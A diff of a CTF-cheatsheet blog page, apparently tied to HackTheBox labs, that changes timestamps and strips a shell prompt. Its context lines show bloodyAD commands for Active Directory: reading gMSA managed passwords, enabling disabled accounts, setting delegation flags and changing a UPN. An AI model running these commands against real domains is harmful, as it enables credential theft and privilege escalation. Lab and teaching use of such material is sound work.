@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Febc8dc6e-40a9-492f-839f-b175138faa93%2Fcat.png?table=block&id=14fd3b99-8509-80fd-bbe8-daf204d95fcc&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2">
 <meta property="article:published_time" content="2024-12-01T20:16:14.000Z">
-<meta property="article:modified_time" content="2025-02-10T15:04:22.723Z">
+<meta property="article:modified_time" content="2025-02-10T15:05:21.139Z">
 <meta property="article:author" content="serioton">
 <meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
 <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2025-02-10 15:04:22'
+  postUpdate: '2025-02-10 15:05:21'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -182,9 +182,9 @@
 <h3 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_username</span> --attr msDS-ManagedPassword</span><br></pre></td></tr></table></figure>
 <h3 id="Enable-a-Disabled-Account"><a href="#Enable-a-Disabled-Account" class="headerlink" title="Enable a Disabled Account"></a>Enable a Disabled Account</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> remove uac <span class="variable">$target_username</span> -f ACCOUNTDISABLE</span><br></pre></td></tr></table></figure>
 <h3 id="Add-The-TRUSTED-TO-AUTH-FOR-DELEGATION-Flag"><a href="#Add-The-TRUSTED-TO-AUTH-FOR-DELEGATION-Flag" class="headerlink" title="Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag"></a>Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add uac <span class="variable">$target_username</span> -f TRUSTED_TO_AUTH_FOR_DELEGATION</span><br></pre></td></tr></table></figure>
-<h3 id="Modify-UPN"><a href="#Modify-UPN" class="headerlink" title="Modify UPN"></a>Modify UPN</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  darkcorp bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="variable">$old_upn</span> userPrincipalName -v <span class="variable">$new_upn</span></span><br></pre></td></tr></table></figure>
+<h3 id="Modify-UPN"><a href="#Modify-UPN" class="headerlink" title="Modify UPN"></a>Modify UPN</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="variable">$old_upn</span> userPrincipalName -v <span class="variable">$new_upn</span></span><br></pre></td></tr></table></figure>
 <p>Check if it has been modified</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  darkcorp bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_user</span> --attr userPrincipalName</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb</span><br><span class="line">userPrincipalName: angela.w.adm</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_user</span> --attr userPrincipalName</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb</span><br><span class="line">userPrincipalName: angela.w.adm</span><br></pre></td></tr></table></figure>
 
 
 <h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><ul>
